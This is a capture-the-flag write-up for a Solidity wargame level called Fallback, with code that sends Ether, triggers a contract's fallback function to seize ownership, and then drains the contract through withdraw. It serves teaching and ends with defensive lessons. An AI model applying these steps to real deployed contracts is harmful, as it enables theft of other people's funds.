# Level 1: Fallback

The Fallback challenge highlights the risks of unintended fallback functions. The goal is to become the contract's owner by exploiting the fallback function.


## Goal

- **Become the contract owner by sending Ether and manipulating the fallback function.**

## Solution

The `Fallback` contract contains a fallback function that transfers ownership under specific conditions:

```solidity
function() external payable {
    if (msg.value > 0 && contributions[msg.sender] > 0) {
        owner = msg.sender;
    }
}
```

## To exploit this:

1. **Contribute Ether**

```javascript
const target = contract.address;
const me = player; // this is your account

await contract.contribute({
  from: me,
  value: toWei("0.0001")
});
```

2. **Trigger the Fallback Function**  
Send Ether directly to the contract without calling any function:

```javascript
// Send ETH *outside* the ABI to hit the fallback
await sendTransaction({
  from: me,
  to: target,
  value: toWei("0.0001")
});
```

3. **Take Ownership**  
The fallback function executes, setting the `owner` to the player address:

```javascript
// now you are now owner
console.log("owner =", await contract.owner(), "player =", me);
```

4. **Drain the Contract**  
Call the `withdraw` function to transfer all funds:

```javascript
await contract.withdraw({ from: me });
```

---

## Lessons Learned with this challenge

- Fallback functions can introduce unintended behavior if they are not properly restricted.
- Always validate conditions before updating critical states like ownership.
- Avoid relying on implicit behavior in Solidity.

